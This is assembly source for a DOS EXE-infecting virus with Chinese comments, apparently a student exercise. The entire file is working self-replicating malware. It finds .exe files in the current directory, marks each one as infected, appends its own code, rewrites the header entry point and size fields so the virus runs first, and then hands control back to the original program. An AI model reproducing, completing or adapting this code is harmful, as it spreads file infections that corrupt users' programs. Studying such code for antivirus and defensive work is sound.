CSEG segment
    assume cs:CSEG
start: 
    mov ax,cs
    mov ds,ax ;为了方便写入病毒，在代码段定义存储空间，这里代码段和数据段共用
    call virus   
    cmp bp,0
    jnz ret_original
    mov ah,4ch
    int 21h
ret_original: ;这个地方主要是在执行完病毒程序后将控制权返回给原程序，因为我们感染的时候已经将原程序的入口转移到02eH
    mov ax,4200h ;ah=42H,al=00,相对文件头来进行位移
    mov cx,0 
    mov dx,0    ;CX:DX=位移量，为0
    int 21h

    mov ah,3fh ;从文件头开始读，根据是ax为文件指针
    mov cx,30h
    lea dx,[bp+offset content]
    mov di,dx
    int 21h

    push cs ;跳转回原程序代码
    mov ax,word ptr [di+02eh]
    push ax
    retf;修改cs的值，远转移

;定义内存空间
filepath db "*.exe",0;通配符，查找exe文件
dta db 02bh dup(0);初始化为0，用于存储上一个文件信息的数据块
string db "I'm a virus!",13D,10D,'$'
content db 30h dup(0) ;读取文件写入的缓冲区

virus proc
    call first;为了方便得到BP的值
first:
    pop bp
    sub bp,offset first

    lea dx,[bp+offset string] ;输出字符串
    mov ah,09h
    int 21h

    lea dx,[bp+offset dta] ;初始化dta
    mov ah,1ah ;设置dta的功能
    int 21h

    lea dx,[bp+offset filepath] ;查找第一个文件,dx存储文件路径字符串
    mov cx,0;0表示普通文件
    mov ah,4eh
    int 21h
    jnc infecting
    jmp error;c为1出错
infecting:
    lea dx,[bp+offset dta] ;文件名地址,dta存储第一个文件的原始信息
    add dx,1eh;增加30个字节,跳过其他无关信息,来到文件名和拓展名的首地址,至于为什么是30字节，和dta存储的文件访问信息有关系
    
    mov ax,3d02h ;打开文件,读写
    int 21h

    mov bx,ax ;打开文件打开保留到了ax,但读文件参数文件代号须保存到BX中
    mov ax,4200h ;到文件头,al为0:表示从文件的头绝对位移
    mov cx,0
    mov dx,0 ;CX:DX=位移量，为0
    int 21h

    mov ah,3fh ;读文件头
    mov cx,30h ;读入的字符数
    lea dx,[bp+offset content] ;文件内容保存到content
    mov di,dx ;di作为下标
    int 21h

    cmp word ptr [di],5a4dh ;检查是否是exe,老师发的pdf里面有，为exe文件的表示
    jnz next

    cmp word ptr [di+2ah],4112h ;检查是否已被感染
    je next
    mov word ptr [di+2ah],4112h ;标记没感染的,杀毒根据这个来判断---------------------

    mov ax,word ptr [di+014h] ;保存原程序入口,14-15字节保存的是装入模块入口时的IP值 
    mov word ptr [di+02eh],ax ;2eH存储原来程序的起始地址，14H存储程序在运行时的起始执行位置，这里为了先执行病毒再执行原程序而设置

    mov cx,0 
    mov dx,0
    mov ax,4202h ;2:从文件尾绝对位移
    int 21h ;此时DX:AX指向文件尾
    ;根据病毒的物理地址计算病毒的偏移地址,看不懂没关系，杀毒和防护不涉及
    push ax
    sub ax,200h ;文件头大小为200H,200H开始为原程序的起始物理地址
    mov cx,ax;
    mov ax,[di+16h] ;16-17字节装入模块代码相对段值（CS） 
    mov dx,10h
    mul dx
    sub cx,ax
    mov word ptr [di+14h],cx ;程序在载入运行时第一条指令地址,病毒必须修改此处
    pop ax
                   
    lea dx,[bp+offset start] ;写入代码,为了方便，全部写入，这样感染具有传染性
    lea cx,[bp+offset finished]
    sub cx,dx ;cx寄存器表示写入的字节数
    mov ah,40h
    int 21h

    mov ax,4202h ;计算新文件长度
    mov cx,0
    mov dx,0
    int 21h    
    mov cx,200h
    div cx  ;DX:AX为文件指针
    inc ax  ;不足200H的也算一个
    mov word ptr [di+2],dx
    mov word ptr [di+4],ax
    
    mov ax,4200h 
    mov cx,0
    mov dx,0
    int 21h ;定位到文件头，全部写入
    mov ah,40h
    mov dx,di
    mov cx,30h
    int 21h ;写入重要的文件头部分即可

next:
    mov ah,3eh ;关闭文件
    int 21h

    mov ah,4fh ;查找下一个文件 ;依据是dta
    int 21h
    jc error
    jmp infecting

error:
    ret
virus endp
finished: ;写入的病毒代码结束的地方
CSEG ends
end start
